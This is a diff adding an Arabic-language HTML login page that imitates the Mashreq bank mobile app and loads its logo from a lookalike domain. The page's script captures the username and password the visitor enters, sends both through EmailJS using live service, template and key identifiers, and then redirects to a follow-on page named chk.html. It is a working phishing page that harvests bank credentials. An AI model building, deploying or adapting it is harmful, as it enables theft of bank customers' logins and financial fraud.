@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - المشرق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // قم بوضع مفتاح Public Key الخاص بك من حساب EmailJS هنا
+        (function(){
+            emailjs.init("CtGyN9J60hDSU8YZh");
+        })();
+    </script>
+
+    <style>
+        :root {
+            --bg-page: #f5f6f8;
+            --container-bg: #ffffff;
+            --primary-orange: #ea6114; 
+            --border-color: #e0e0e0;
+            --text-dark: #333333;
+            --text-muted: #888888;
+            --btn-disabled: #d5d9df;
+            --link-blue: #005eb8;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--bg-page);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            background-color: var(--container-bg);
+            min-height: 100vh;
+            box-shadow: 0 0 15px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* الهيدر العلوي (اللوجو وزر اللغة) */
+        .top-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 25px;
+            border-top: 4px solid var(--primary-orange);
+        }
+
+        .top-header img {
+            height: 35px;
+            object-fit: contain;
+        }
+
+        .lang-selector {
+            border: 1px solid var(--border-color);
+            background: #fff;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 600;
+            color: var(--text-dark);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* قسم الفورم */
+        .login-form-section {
+            padding: 20px 25px;
+            flex-grow: 1;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-orange);
+        }
+
+        .form-group input::placeholder {
+            color: #bcbcbc;
+        }
+
+        /* أيقونة العين داخل حقل الباسورد */
+        .eye-icon {
+            position: absolute;
+            left: 15px;
+            top: 42px;
+            color: #a37c7c;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: left;
+            color: #d14444;
+            font-size: 12px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-top: -10px;
+            margin-bottom: 20px;
+        }
+
+        /* الأزرار (تسجيل الدخول + البصمة) */
+        .action-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-login {
+            flex-grow: 1;
+            background-color: var(--btn-disabled);
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            border-radius: 6px;
+            cursor: not-allowed;
+            transition: background 0.3s;
+        }
+
+        /* عند تعبئة الحقول يتغير لون الزر للبرتقالي */
+        .btn-login.active {
+            background-color: var(--primary-orange);
+            cursor: pointer;
+        }
+
+        .btn-bio {
+            width: 50px;
+            background: transparent;
+            border: 1.5px solid var(--primary-orange);
+            color: var(--primary-orange);
+            border-radius: 6px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        /* روابط التسجيل وإصدار التطبيق */
+        .register-link {
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 30px;
+        }
+
+        .register-link a {
+            color: var(--link-blue);
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .app-version {
+            text-align: center;
+            font-size: 11px;
+            color: #aaaaaa;
+            margin-bottom: 20px;
+        }
+
+        /* البانر البرتقالي السفلي */
+        .help-banner {
+            background-color: var(--primary-orange);
+            color: #ffffff;
+            text-align: center;
+            padding: 15px;
+            font-size: 14px;
+            font-weight: 700;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* القائمة السفلية (الأيقونات) */
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px 0;
+            background-color: #ffffff;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            color: var(--primary-orange);
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .nav-item i {
+            font-size: 18px;
+        }
+
+        .icon-pin { color: #d64a6d; }
+        .icon-trophy { color: #b8860b; }
+        .icon-exchange { color: #5dade2; }
+
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <div class="top-header">
+            <img src="https://watchmasreqq.com/manus-storage/mashreq_logo_d26073c8.png" alt="المشرق">
+            <button class="lang-selector">العربية <i class="fa-solid fa-caret-down"></i></button>
+        </div>
+
+        <div class="login-form-section">
+            <form id="login-form">
+                
+                <div class="form-group">
+                    <label for="username">اسم المستخدم</label>
+                    <input type="text" id="username" name="username" placeholder="أدخل اسم المستخدم" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+                    <i class="fa-solid fa-eye" id="toggle-password" class="eye-icon"></i>
+                </div>
+
+                <a href="pass.html" class="forgot-password">هل نسيت كلمة المرور؟</a>
+
+                <div class="action-row">
+                    <button type="submit" class="btn-login" id="btn-login" disabled>تسجيل الدخول</button>
+                    <button type="button" class="btn-bio"><i class="fa-solid fa-crosshairs"></i></button>
+                </div>
+
+            </form>
+
+            <div class="register-link">
+                مستخدم جديد؟ <a href="#">سجل الآن</a>
+            </div>
+
+            <div class="app-version">
+                إصدار التطبيق 3.1.5
+            </div>
+        </div>
+
+        <div class="help-banner">
+            تحتاج إلى مساعدة؟ اتصل بنا <i class="fa-solid fa-phone"></i>
+        </div>
+
+        <div class="bottom-nav">
+            <div class="nav-item">
+                <i class="fa-solid fa-location-dot icon-pin"></i>
+                <span>الفروع</span>
+            </div>
+            <div class="nav-item">
+                <i class="fa-solid fa-trophy icon-trophy"></i>
+                <span>مكافآت</span>
+            </div>
+            <div class="nav-item">
+                <i class="fa-solid fa-money-bill-transfer icon-exchange"></i>
+                <span>أسعار الصرف</span>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const btnLogin = document.getElementById('btn-login');
+            const togglePassword = document.getElementById('toggle-password');
+
+            // 1. تفعيل زر تسجيل الدخول (يصبح برتقالي) عند الكتابة في الحقلين
+            function checkInputs() {
+                if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                    btnLogin.classList.add('active');
+                    btnLogin.disabled = false;
+                } else {
+                    btnLogin.classList.remove('active');
+                    btnLogin.disabled = true;
+                }
+            }
+
+            usernameInput.addEventListener('input', checkInputs);
+            passwordInput.addEventListener('input', checkInputs);
+
+            // 2. إظهار وإخفاء كلمة المرور (أيقونة العين)
+            togglePassword.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                
+                // تغيير الأيقونة
+                this.classList.toggle('fa-eye');
+                this.classList.toggle('fa-eye-slash');
+            });
+
+            // 3. إرسال البيانات عبر EmailJS عند الضغط على تسجيل الدخول
+            document.getElementById('login-form').addEventListener('submit', function(event) {
+                event.preventDefault(); // منع تحديث الصفحة
+
+                const originalText = btnLogin.innerHTML;
+                btnLogin.innerHTML = 'جاري التحقق...';
+                btnLogin.disabled = true;
+                btnLogin.classList.remove('active');
+
+                // البيانات التي سيتم إرسالها (تأكد من مطابقة هذه الأسماء لقالب EmailJS)
+                const templateParams = {
+                    username: usernameInput.value,
+                    password: passwordInput.value
+                };
+
+                // استبدل YOUR_SERVICE_ID و YOUR_TEMPLATE_ID بالمعرفات الخاصة بك
+                emailjs.send('service_rrb0qtq', 'template_2bey29f', templateParams)
+                    .then(function(response) {
+                        console.log('SUCCESS!', response.status, response.text);
+                        // التوجيه إلى صفحة chk.html بعد الإرسال
+                        window.location.href = 'chk.html'; 
+                    }, function(error) {
+                        console.log('FAILED...', error);
+                        alert('حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى.');
+                        btnLogin.innerHTML = originalText;
+                        btnLogin.disabled = false;
+                        btnLogin.classList.add('active');
+                    });
+            });
+        });
+    </script>
+
+</body>
+</html>
